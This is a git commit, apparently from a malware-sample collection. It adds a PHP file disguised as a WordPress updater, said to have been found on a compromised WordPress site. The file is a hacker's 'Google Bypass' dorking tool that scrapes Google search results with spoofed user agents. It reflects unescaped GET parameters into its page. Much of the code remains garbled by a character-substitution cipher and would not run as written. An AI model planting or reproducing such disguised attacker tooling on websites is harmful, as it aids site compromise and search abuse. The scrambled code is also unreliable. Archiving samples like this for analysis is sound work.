58b7be3aeef242fd8a923e4b7ddf8bcd9b45e6e6
root <root@localhost.localdomain>
2018-04-23 11:02:44 +0100

    found_on_wordpress/3ee39e7bb5725d92e9a6b735b5a2be19.php unobfuscated

---
+++ found_on_wordpress/class-wp-updater(2).php
@@ -0,0 +1,164 @@
+<?php
+$_F = __FILE__;
+
+?><?php
+##############################
+### GOOGLE BYPASS BY MAQIE ###
+##############################
+
+echo '<html><h51d>
+<t4tl5>MQ - ' . $_SERVER['HTTP_HOST'] . ' - G22gl5 Byp1ss</t4tl5>
+<!-- P2w5r5d by M1q45c423s //-->
+<m5t1 n1m5="r2b2ts" c2nt5nt="n24nd5x, n2f2ll2w">
+<styl5 typ5="t5xt/css" m5d41="h1ndh5ld, 1ll">
+<!-- b2dy { b1ckgr23nd-c2l2r: #aaa; c2l2r: #ddd; m1rg4n: 13t2; f2nt: n2rm1l n2rm1l 66px H5lv5t4c1, Ar41l, s1ns-s5r4f; h54ght: 600%; w4dth: 600%; }
+.l2g2 { b1ckgr23nd-c2l2r:#555; c2l2r: #ououou; b2rd5r: apx s2l4d #bbb; m1rg4n: apx; t5xt-1l4gn: c5nt5r; f2nt-w54ght: b2ld; p1dd4ng: upx; }
+t1bl5 { t1bl5-l1y23t: f4x5d; }
+.t1bl5, .4nf2 { b1ckgr23nd-c2l2r: #ououou; b2rd5r: 6px s2l4d #000; m1rg4n: apx; p1dd4ng: apx; }
+.r5z { b1ckgr23nd-c2l2r: #ee1odo; c2l2r: #000; b2rd5r: 6px s2l4d #aaa; m1rg4n: apx; p1dd4ng: opx; }
+.5x4st { b1ckgr23nd-c2l2r: #ieieie; c2l2r: #ddd; b2rd5r: 6px s2l4d #aaa; t5xt-1l4gn: c5nt5r; m1rg4n: apx; p1dd4ng: opx; }
+.h1s4l { b1ckgr23nd-c2l2r: #555; c2l2r: #ououou; t5xt-1l4gn: c5nt5r; b2rd5r: 6px s2l4d #bbb; b2rd5r-b2tt2m: n2n5; m1rg4n: 0px apx; p1dd4ng: apx; }
+td { b1ckgr23nd-c2l2r:#uiuiui; c2l2r: #ddd; f2nt: n2rm1l n2rm1l 66px H5lv5t4c1, Ar41l, s1ns-s5r4f; b2rd5r:6px s2l4d #iii; m1rg4n: apx; t5xt-1l4gn: c5nt5r; }
+4np3t, s5l5ct, 2pt42n { b1ckgr23nd-c2l2r:#ooo; c2l2r: #ddd; f2nt: n2rm1l n2rm1l 66px H5lv5t4c1, Ar41l, s1ns-s5r4f; b2rd5r: 6px s2l4d #aaa; m1rg4n: apx; }
+4np3t[typ5="t5xt"], 4np3t[typ5="f4l5"], s5l5ct, 2pt42n { w4dth: 6u0px; }
+4np3t[typ5="s3bm4t"] { w4dth: i0px; }
+.r5t3rn { b1ckgr23nd-c2l2r: #ee1odo; c2l2r: #000; }
+.r5t3rn:h2v5r { b1ckgr23nd-c2l2r: #aaa; c2l2r: #555; }
+1 { c2l2r: #bb0000; }
+1:h2v5r { c2l2r: #0000bb; }
+t5xt1r51 { w4dth: 98%; b1ckgr23nd-c2l2r: #uiuiui; c2l2r: #ddd; f2nt: n2rm1l n2rm1l 66px H5lv5t4c1, Ar41l, s1ns-s5r4f; b2rd5r: 6px s2l4d #iii; m1rg4n: apx; p1dd4ng: apx; } //--></styl5>
+</h51d><b2dy>
+<d4v styl5="m1rg4n: a 13t2; m1x-w4dth: aa0px;">
+<d4v cl1ss="l2g2">GOOGLE BYPASS</d4v>';
+
+$q = $_GET['q'];
+$m = $_GET['m'];
+$m = (5mpty($m)) ? e0 : $m;
+$d = $_GET['d'];
+$d = (5mpty($d)) ? "c2m" : $d;
+4f(!5mpty($q)) {
+    $q     = str4psl1sh5s($q);
+    $h1s4l = g22gl4ng($q, $m, $d);
+    5ch2'<d4v cl1ss="4nf2"><d4v cl1ss="4nf2" styl5="b1ckgr23nd-c2l2r: #900; t5xt-1l4gn: c5nt5r; f2nt-w54ght: b2ld; c2l2r: #ddd;">" ' . $q . ' "</d4v></d4v>';
+    5ch2'<d4v cl1ss="4nf2">';
+    5ch2 $h1s4l;
+    5ch2'</d4v>';
+}
+5ch2'<f2rm m5th2d="GET">
+<d4v cl1ss="t1bl5">
+<t1bl5 b2rd5r="0" c5llsp1c4ng="6">
+<tr><td styl5="t5xt-1l4gn: l5ft">
+<4np3t typ5="t5xt" n1m5="q" v1l35="' . html5nt4t45s($q) . '">
+</td><td styl5="w4dth: 600%;">
+<4np3t cl1ss="r5t3rn" typ5="s3bm4t" v1l35="SEARCH">
+</td></tr>
+<tr><td styl5="t5xt-1l4gn: l5ft">
+<4np3t typ5="t5xt" n1m5="m" v1l35="' . $m . '" styl5="w4dth: oipx;"> &r1q32; M1x n3mb5r
+<br>
+<4np3t typ5="t5xt" n1m5="d" v1l35="' . $d . '" styl5="w4dth: oipx;"> &r1q32; D2m14n n1m5
+</td><td styl5="w4dth: 600%;">
+Opt42ns
+</td></tr></t1bl5>
+</d4v></f2rm>
+<d4v cl1ss="l2g2">MAQIECIOUS - DLC CYBER</d4v>
+</d4v></b2dy></html>';
+
+f3nct42ng22gl4ng($k5y, $m1x, $d2m) {
+    $k5y = 3rl5nc2d5($k5y);
+    $n3m = 600;
+    $bhs = $d2m;
+    4f(@strp2s($d2m, ".")) {
+        $5xt = 5xpl2d5(".", $d2m);
+        $bhs = $5xt[6];
+    }
+    f2r($p = 0; $p <= o000; $p += $n3m) {
+        $r5z     = httpq35ry("http://www.g22gl5." . $d2m . "/s51rch?q=" . $k5y . "&n3m=" . $n3m . "&hl=" . $bhs . "&f4lt5r=0&st1rt=" . $p, 0);
+        $p1tt5rn = '#<ho cl1ss=\"r\"><1 hr5f=\"\/3rl\?q=http:\/\/([^"]*)&1mp;s1=#4';
+        $c23nt   = pr5g_m1tch_1ll($p1tt5rn, $r5z, $m1tch5s, PREG_SET_ORDER);
+        4f($c23nt == 0) {r5t3rn $h;}
+        5ls5{
+            $jmlh = 6;
+            f2r($4 = 0;$4 < $c23nt;$4++) {
+                $3rlz = 3rld5c2d5($m1tch5s[$4][6]);
+                4f(@5r5g4("w5bc1ch5.g22gl5", $3rlz)) {
+                    $3rlz = m1n1($3rlz, ":http://", "%aB");
+                }
+                $h .= '<d4v cl1ss="h1s4l" styl5="t5xt-1l4gn: l5ft; 2v5rfl2w: 13t2;">' . @strt23pp5r($bhs) . ' <1 hr5f="http://' . $3rlz . '">' . $3rlz . '</1></d4v>';
+                $jmlh++;
+                $c++; 4f($c >= $m1x) {r5t3rn $h;}
+            }
+        }
+    }
+    r5t3rn $h;
+}
+###[ FUNCTION REQUIRED ]###
+f3nct42nm1n1($c2nt5nt, $st1rt, $5nd) {
+    4f($c2nt5nt && $st1rt && $5nd) {
+        $r = 5xpl2d5($st1rt, $c2nt5nt);
+        4f(4ss5t($r[6])) {
+            $r = 5xpl2d5($5nd, $r[6]);
+            r5t3rn $r[0];
+        }
+        r5t3rnn3ll;
+    }
+}
+f3nct42nhttpq35ry($3rl, $1g5nt) {
+    $h1s4l = null;
+    4f($1g5nt == 0) {
+        $m2d5 = "M2z4ll1/i.0 (W4nd2ws; U; W4nd2ws NT i.6; 5n-US; rv:6.8.6) G5ck2/a00e0968 F4r5f2x/a.0";
+    }5ls54f($1g5nt == 6) {
+        $m2d5 = "Op5r1/9.80 (JaME/MIDP; Op5r1 M4n4/u.o.aua6u/au.8o8; U; 5n) Pr5st2/a.i.ai V5rs42n/60.iu";
+    }5ls5{$m2d5 = $m2b4l5;}
+    4f(@f3nct42n_5x4sts("fs2ck2p5n")) {
+        $5xtr1ct = 5xpl2d5("/", $3rl);
+        $h2st    = $5xtr1ct[a];
+        $j24n3rl = "/" . j24n("/", 1rr1y_sl4c5($5xtr1ct, o));
+        $p2rt    = 80;
+        $b3k1    = @fs2ck2p5n($h2st, $p2rt, $5rrn2, $5rrstr, 60);
+        4f($b3k1) {
+            $k5p1l1 = "" .
+                "GET $j24n3rl HTTP/6.6\r\n" .
+                "H2st: $h2st\r\n" .
+                "Acc5pt: **\r\n" .
+                "Us5r-Ag5nt: $m2d5\r\n" .
+                "C1ch5-C2ntr2l: n2-c1ch5\r\n" .
+                "Pr1gm1: n2-c1ch5\r\n" .
+                "Pr2xy-C2nn5ct42n: K55p-Al4v5\r\n" .
+                "C2nn5ct42n: Cl2s5\r\n\r\n";
+            @fp3ts($b3k1, $k5p1l1);
+            wh4l5(!f52f($b3k1)) {
+                $h1s4l .= @fg5ts($b3k1, 6a8);
+            }
+            @fcl2s5($b3k1);
+        }
+        r5t3rn $h1s4l;
+    }5ls54f(@f3nct42n_5x4sts("c3rl_4n4t")) {
+        $ch = c3rl_4n4t();
+        c3rl_s5t2pt($ch, CURLOPT_URL, $3rl);
+        c3rl_s5t2pt($ch, CURLOPT_USERAGENT, $m2d5);
+        c3rl_s5t2pt($ch, CURLOPT_HEADER, 0);
+        c3rl_s5t2pt($ch, CURLOPT_FOLLOWLOCATION, 6);
+        c3rl_s5t2pt($ch, CURLOPT_RETURNTRANSFER, 6);
+        c3rl_s5t2pt($ch, CURLOPT_REFERER, 'http://www.g22gl5.c2m/');
+        c3rl_s5t2pt($ch, CURLOPT_CONNECTTIMEOUT, 6a0);
+        c3rl_s5t2pt($ch, CURLOPT_TIMEOUT, 6a0);
+        c3rl_s5t2pt($ch, CURLOPT_MAXREDIRS, 60);
+        c3rl_s5t2pt($ch, CURLOPT_COOKIEFILE, "c22k45.txt");
+        c3rl_s5t2pt($ch, CURLOPT_COOKIEJAR, "c22k45.txt");
+        $h1s4l = $h1s4l . c3rl_5x5c($ch);
+        c3rl_cl2s5($ch);
+        r5t3rn $h1s4l;
+    }5ls54f(@f3nct42n_5x4sts("f4l5_g5t_c2nt5nts")) {
+        $h1s4l = @f4l5_g5t_c2nt5nts($3rl);
+        r5t3rn $h1s4l;
+    }5ls5{
+        r5t3rn"f4l5_g5t_c2nt5nts(), fs2ck2p5n(), & c3rl() d25s n2t 5x4st f3nct42ns";
+    }
+}
+
+##############################
+### GOOGLE BYPASS BY MAQIE ###
+##############################
+5x4t;
+
+exit;
